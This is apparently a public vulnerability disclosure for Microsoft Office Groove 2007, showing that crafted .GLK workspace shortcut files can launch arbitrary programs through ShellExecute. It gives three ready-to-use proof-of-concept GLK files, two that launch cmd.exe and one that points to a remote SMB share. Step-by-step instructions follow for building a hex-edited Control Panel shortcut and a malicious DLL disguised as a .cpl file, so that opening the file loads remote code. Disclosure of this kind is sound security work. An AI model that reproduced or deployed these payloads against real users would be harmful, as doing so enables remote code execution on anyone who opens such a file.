
Vendor Homepage: http://www.microsoft.com/

Software Link: https://products.office.com/

Version: 2007  32-bits  (Due to the nature of the issue, it would work on the x64 version of Office 2007, but I don&#039;t know if there&#039;s one ??)

Tested on: Windows 7/Server 2008/Vista/Server 2003/XP (X86 and x64)

CVE: N/A


Description:

MS Office Groove contains a security bypass issue regarding &#039;Workspace Shortcut&#039; files (.GLK)
because it allows arbitrary (registered) URL Protocols to be passed, when only &#039;grooveTelespace://&#039; URLs
should be allowed, which allows execution of arbitrary code upon opening a &#039;GLK&#039; file.
Usually, URLs are passed to web browsers, but because it uses &#039;ShellExecute()&#039;, if malicious users pass
a &#039;file:///&#039; URL, it will launch the default application for the file type specified in the URL. Important:
the &#039;GLK&#039; extension is not in any of the Microsoft black list (eg. Outlook, IE) so we assume it&#039;s a &#039;safe&#039; file type. 2 proof of
concepts are provided, one for simply launching &#039;cmd.exe&#039;, and another, remote, that works on any Windows version:

-----poc_cmd_x64.GLK--------------------------------------------------------------------------------

<?xml version=&#039;1.0&#039;?><?groove.net version=&#039;1.0&#039;?><ns1:ExplorerLink xmlns:ns1="urn:groove.net">
    <ns1:NavigationInfo URL="file:///C:\windows\syswow64\cmd.exe"/>
</ns1:ExplorerLink>

----------------------------------------------------------------------------------------------------

-----poc_cmd_x86.GLK--------------------------------------------------------------------------------

<?xml version=&#039;1.0&#039;?><?groove.net version=&#039;1.0&#039;?><ns1:ExplorerLink xmlns:ns1="urn:groove.net">
    <ns1:NavigationInfo URL="file:///C:\windows\system32\cmd.exe"/>
</ns1:ExplorerLink>

----------------------------------------------------------------------------------------------------

-----poc_CPL.GLK------------------------------------------------------------------------------------

<?xml version=&#039;1.0&#039;?><?groove.net version=&#039;1.0&#039;?><ns1:ExplorerLink xmlns:ns1="urn:groove.net">
    <ns1:NavigationInfo URL="file:///\\192.168.0.50\share\CPL_Shortcut.lnk"/>
</ns1:ExplorerLink>

----------------------------------------------------------------------------------------------------

* the &#039;CPL_Shortcut.lnk&#039; is a special type of shortcut, which doesn&#039;t trigger warnings upon opening,
that can be easily created by dragging a
Windows Control Panel item icon from the Control Panel folder to the Desktop. Notice the item must be
a CPL file, not a special folder (some control panel items are just special types of folder not the
classic CPL file.

The easiest way to do it is:

a) Grab a Windows XP machine (there are lots of Control Panel items that are CPL files)

b) Drag and drop an icon, eg. the &#039;User Accounts&#039; icon to the Desktop.

c) Open the shortcut file created in the Desktop with an Hex Editor (you may need to rename the file,
removing the &#039;.lnk&#039; extension or some programs will load the target of the shortcut instead of the shortcut
file itself). Edit the portion (in &#039;Unicode&#039; format) that points to :
c:\windows\system32\nusrmgr.cpl and write an UNC path pointing to a valid CPL file:
\\192.168.0.50\share\cpl_sh.cpl  (don&#039;t forget the maximum path length (32 chars) must NOT be exceeded.)

d) Save the file and rename it to "CPL_Shortcut.lnk" and finally place it in the appropriate folder,
which will be accessed from remote, via: \\192.168.0.50\share

e) Using MS Visual Studio (tested with a C++ DLL compiled with VS 2008),
compile a DLL with code of choice and a &#039;DllMain&#039; function and name it "cpl_sh.cpl".

f) Make sure the share and the 2 files (the .CPL and .LNK) are anonymously accessible from a remote
machine.

That&#039;s it, now just open the &#039;GLK&#039; files. Both &#039;cmd.exe&#039; and the CPL file should be executed/loaded.
Notice the files located in the remote share will take longer than &#039;CMD.exe&#039; to be executed for obvious
reasons, just wait a few seconds.


- Eduardo Braun Prado

